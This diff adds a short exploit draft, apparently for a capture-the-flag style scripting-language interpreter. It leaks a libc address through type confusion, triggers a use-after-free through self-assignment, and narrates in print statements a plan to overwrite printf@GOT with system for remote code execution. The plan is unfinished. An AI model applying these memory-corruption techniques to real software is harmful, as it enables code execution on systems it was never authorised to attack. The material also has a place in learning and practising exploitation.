@@ -1,0 +1,39 @@
+print("=== RCE via Use-After-Free Direct Write ===");
+
+print("Step 1: Leak libc");
+string v2 = "BBBBBBBB";
+int v2 = 4231312;
+int leaked = length(v2);
+print("Leaked:");
+print(leaked);
+
+print("Step 2: Calculate system");
+print("system_addr = calculated value");
+
+print("Step 3: Create target variable");
+string target = "target";
+print("Target created");
+
+print("Step 4: Create use-after-free");
+target = target;
+print("UAF: target.value_ptr points to freed memory");
+
+print("Step 5: Groom heap with controlled data");
+print("Allocate string with system address as data");
+print("If this reuses freed memory, target points to it");
+
+print("Step 6: Write system to GOT");
+print("If we can make target point to printf@GOT,");
+print("we can write: target = system_addr");
+print("But this requires corrupting value_ptr first");
+
+print("Step 7: Alternative - use bitmap to corrupt value_ptr");
+print("Use bitmap overflow to write printf@GOT to value_ptr");
+print("Then use target to write system_addr to GOT");
+
+print("This still needs bitmap buffer address...");
+
+print("Step 8: Final approach - leak bitmap buffer");
+print("Use OOB read to find bitmap struct");
+print("Read bitmap struct's data_ptr field");
+
